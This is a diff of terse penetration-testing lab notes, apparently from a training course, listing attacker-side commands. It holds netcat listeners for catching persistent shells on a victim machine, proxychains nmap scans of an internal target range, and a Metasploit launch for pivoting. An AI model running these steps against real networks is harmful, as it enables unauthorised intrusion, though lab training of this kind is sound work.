@@ -1,4 +1,5 @@
 https://docs.google.com/document/d/1JrZwgBWYPLqBC2X1TcaHTomDRcLvnaJJcHp34pDkkcA/edit?usp=sharing
+[From Day 11]
 
 catch persistent shell	
 (ATK) nc -lvp 55556
@@ -24,7 +25,11 @@ open ssh for a listner to set up proxy
 
 (ATK)(TERM 2) LS > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS > CD 192.168.1.102 
 
-(ATK)(TERM 2) sudo proxychains nmap -iL scope -F Pn -sT (VERIFY ITS WORKING)
+(ATK)(TERM 2) sudo proxychains nmap -iL scope -F Pn -sT | tee fast_scan
 
-catch user persistence shell ON VIC2 [[14:02]]DAY 12
-nc -lvp 55555
+(ATK)(TERM 2) sudo proxychains nmap -iL scope -sV -Pn -sT | tee service_scan [1:19:52]
+
+(ATK)(TERM 3) sudo proxychains msfconsole [1:24:44]
+
+[[continued... on Metasploit through proxy chains]]
+
